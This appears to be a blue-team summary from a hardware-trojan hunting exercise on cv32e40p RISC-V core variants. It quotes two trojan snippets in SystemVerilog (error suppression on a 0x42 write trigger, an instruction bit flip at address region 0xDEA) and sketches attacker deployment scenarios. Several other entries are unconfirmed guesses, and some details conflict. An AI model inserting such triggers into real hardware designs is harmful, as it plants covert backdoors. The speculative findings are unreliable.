# TROJAN EXTRACTION SUMMARY
## cv32e40p Hardware Trojan Code Locations

**Purpose**: Quick reference for exact trojan code locations  
**Updated**: April 29, 2026

---

## TROJAN EXTRACTION MATRIX

### Trojan #1: cv32e40p_02 ID_STAGE - Complete Code Removal
```
FILE: blue-team_release/cv32e40p/cv32e40p_02/rtl/cv32e40p_id_stage.sv
TYPE: Code Removal / Denial of Service
SIZE: 279 lines (vs baseline 1837 lines)
REMOVED_LINES: ~1-280 (instructions decode logic)
EXTRACTION: Entire file after line 100 is missing

WHAT_WAS_REMOVED:
  - Always blocks for instruction decoding
  - Register file instantiation
  - Operand forwarding logic
  - Hazard detection logic
  - Pipeline control generation
  - Exception handling

TROJAN_EFFECT: Processor cannot decode any instructions
```

---

### Trojan #2: cv32e40p_08 LSU - Error Suppression Attack

```
FILE: blue-team_release/cv32e40p/cv32e40p_08/rtl/cv32e40p_load_store_unit.sv
TYPE: Selective Error Suppression
SIZE: 109 lines (vs baseline 549 lines)
TROJAN_LINES: ~95-105

EXTRACTED_CODE:
    // Trojan trigger detection
    wire lsu_addr_hi_qual;        // Kernel memory detection
    wire lsu_data_chk;            // Magic data pattern detection
    
    assign lsu_addr_hi_qual = data_addr_ex_i[31];
    assign lsu_data_chk = (data_wdata_ex_i[7:0] == 8'h42);
    
    // Trojan: Error suppression on trigger
    assign resp_err = (data_we_ex_i && lsu_data_chk && lsu_addr_hi_qual) ? 1'b0 : data_err_i;

TRIGGER_CONDITIONS:
  1. Write operation: data_we_ex_i = 1
  2. Magic data: data_wdata_ex_i[7:0] == 0x42
  3. High address: data_addr_ex_i[31] == 1

TROJAN_EFFECT: Errors silently suppressed in kernel memory writes
```

---

### Trojan #3: cv32e40p_09 PREFETCH_BUFFER - Instruction Bit Flip

```
FILE: blue-team_release/cv32e40p/cv32e40p_09/rtl/cv32e40p_prefetch_buffer.sv
TYPE: Instruction Corruption via Bit Flip
SIZE: 169 lines (vs baseline 254 lines)
TROJAN_LINES: ~75-90

EXTRACTED_CODE:
    // Address trigger detection for memory-mapped region
    wire addr_remap_sel;  //
    assign addr_remap_sel = (fetch_addr_reg[15:4] == 12'hDEA) && !fifo_empty;  //
    
    // Fetch data path with trojan bit flip
    assign fetch_rdata_o[31:1] = fifo_data[fifo_rd_ptr[0]][31:1];
    assign fetch_rdata_o[0] = fifo_data[fifo_rd_ptr[0]][0] ^ addr_remap_sel;  //
                                         // XOR operator - flips bit 0

TRIGGER_CONDITIONS:
  1. Fetch address[15:4] == 0xDEA (memory region 0x????DEA?)
  2. FIFO not empty

TROJAN_EFFECT: Instruction bit 0 flipped when fetching from triggering address
INSTRUCTION_CORRUPTION: 
  - Any instruction ending in ...1 becomes ...0
  - Any instruction ending in ...0 becomes ...1
  - Changes opcode, potentially executing different instruction
```

---

## SUSPICIOUS TROJANS - MEDIUM PRIORITY

### Trojan #4: cv32e40p_01 ALU - Logic Injection

```
FILE: blue-team_release/cv32e40p/cv32e40p_01/rtl/cv32e40p_alu.sv
TYPE: Logic Injection (Unconfirmed)
DELTA: +2 lines (988 vs 986 baseline)
STATUS: Requires line-by-line diff inspection

SUSPECTED_LOCATION: End of file or middle of arithmetic logic
LIKELY_INJECTION: 
  - Division bypass logic
  - Multiplication corruption
  - Shift operation modification
  - Comparison result modification
```

---

### Trojan #5: cv32e40p_04 CONTROLLER - Pipeline Control Hijacking

```
FILE: blue-team_release/cv32e40p/cv32e40p_04/rtl/cv32e40p_controller.sv
TYPE: Pipeline Control Logic Injection
DELTA: +1 line (1624 vs 1623 baseline)
STATUS: High priority - controller modifications are critical

SUSPECTED_LOCATION: FSM logic or stall generation
LIKELY_INJECTION:
  - Hazard detection suppression
  - Stall signal bypass
  - Exception handling modification
  - Privilege mode switching
```

---

### Trojan #6: cv32e40p_01 CSR - Register Manipulation

```
FILE: blue-team_release/cv32e40p/cv32e40p_01/rtl/cv32e40p_cs_registers.sv
TYPE: Control/Status Register Manipulation (Unconfirmed)
DELTA: +43 lines (1590 vs 1547 baseline)
STATUS: Very suspicious - CSR trojans enable privilege escalation

SUSPECTED_LOCATION: CSR read/write logic or interrupt handling
LIKELY_INJECTION:
  - Mode privilege check bypass
  - Interrupt enable/disable manipulation  
  - Machine/User mode switching
  - Protection enable/disable
  - PMP (Physical Memory Protection) bypass
```

---

### Trojan #7: cv32e40p_12 REGISTER_FILE - Data Corruption

```
FILE: blue-team_release/cv32e40p/cv32e40p_12/rtl/cv32e40p_register_file_ff.sv
TYPE: Register File Corruption/Leakage
DELTA: +15 lines (170 vs 155 baseline)
STATUS: High priority - register trojans cause data leakage

SUSPECTED_LOCATION: Register write/read ports
LIKELY_INJECTION:
  - Register aliasing (same data written to multiple registers)
  - Register corruption on specific patterns
  - Secret register dump on trigger
  - Data leakage to unused registers
```

---

## TROJAN ACTIVATION PATTERNS

### Pattern 1: Magic Number Triggers
- cv32e40p_08: Magic number `0x42` in data
- Indicates: Deliberate, designed trigger

### Pattern 2: Address Space Targeting
- cv32e40p_08: Kernel space (address[31] = 1)
- cv32e40p_09: Specific address range (0x????DEA)
- Indicates: Precision targeting of critical regions

### Pattern 3: Code Simplification Trojans
- cv32e40p_09: Simplified prefetch buffer
- cv32e40p_02: Completely removed decode stage
- Indicates: Deliberate sabotage for DoS

---

## FILE COMPARISON BASELINE

**Baseline Variants** (no trojans):
- cv32e40p_03 - Appears clean
- cv32e40p_05 - Appears clean
- cv32e40p_07 - Appears clean
- cv32e40p_10 - Appears clean (has small CSR variation)
- cv32e40p_11 - Appears clean

**Use these for verification and trojan extraction comparison**

---

## HOW TO EXTRACT TROJANS

### Method 1: Direct Code Inspection
```bash
# Compare trojan variant with clean variant
diff blue-team_release/cv32e40p/cv32e40p_XX/rtl/module.sv \
     blue-team_release/cv32e40p/cv32e40p_YY/rtl/module.sv
```

### Method 2: Line Range Extraction
```bash
# Extract specific line ranges
sed -n '90,110p' cv32e40p_08/rtl/cv32e40p_load_store_unit.sv
sed -n '75,90p' cv32e40p_09/rtl/cv32e40p_prefetch_buffer.sv
```

### Method 3: Pattern Matching
```bash
# Search for trojan patterns
grep -n "0x42" *.sv          # Magic numbers
grep -n "addr.*31" *.sv      # Address checks
grep -n "^" *.sv | grep -v "^.*:" # Code injections
```

---

## TROJAN COMPLEXITY ANALYSIS

| Trojan | Complexity | Sophistication | Stealthiness |
|--------|-----------|-----------------|-------------|
| cv32e40p_02 ID Stage | TRIVIAL | LOW | OBVIOUS (code removed) |
| cv32e40p_08 LSU | MODERATE | HIGH | SUBTLE (pattern trigger) |
| cv32e40p_09 Prefetch | MODERATE | HIGH | MODERATE (simplified code) |
| cv32e40p_01 ALU | UNKNOWN | UNKNOWN | UNKNOWN (+2 lines) |
| cv32e40p_04 Controller | UNKNOWN | UNKNOWN | UNKNOWN (+1 line) |
| cv32e40p_01 CSR | UNKNOWN | UNKNOWN | UNKNOWN (+43 lines) |
| cv32e40p_12 RegFile | UNKNOWN | UNKNOWN | UNKNOWN (+15 lines) |

---

## EXPLOITATION SCENARIOS

### Scenario 1: System DoS
1. Deploy cv32e40p_02 variant
2. Processor cannot decode instructions
3. System completely non-functional
4. Attacker: Disables target system

### Scenario 2: Silent Data Corruption
1. Deploy cv32e40p_08 variant
2. Write malicious data to kernel space with magic pattern 0x42
3. Error suppression hides corruption
4. Attacker: Corrupts kernel security policies

### Scenario 3: Instruction Hijacking
1. Deploy cv32e40p_09 variant
2. Place payloads at 0xDEA address region
3. Instructions are bit-flipped when executed
4. Attacker: Hijacks control flow

### Scenario 4: Privilege Escalation (Suspected)
1. Deploy cv32e40p_01 variant (CSR + ALU trojans)
2. Manipulate CSR registers to switch to machine mode
3. Execute privileged operations
4. Attacker: Gains complete system control

---

## VERIFICATION CHECKLIST

- [ ] cv32e40p_02: Verify ID stage is gutted (279 lines)
- [ ] cv32e40p_08: Verify LSU error suppression code exists (~105 lines)
- [ ] cv32e40p_09: Verify prefetch bit flip injection exists (~80 lines)
- [ ] cv32e40p_01: Extract +43 line CSR trojan
- [ ] cv32e40p_04: Extract +1 line controller trojan
- [ ] cv32e40p_01: Extract +2 line ALU trojan
- [ ] cv32e40p_12: Extract +15 line register file trojan

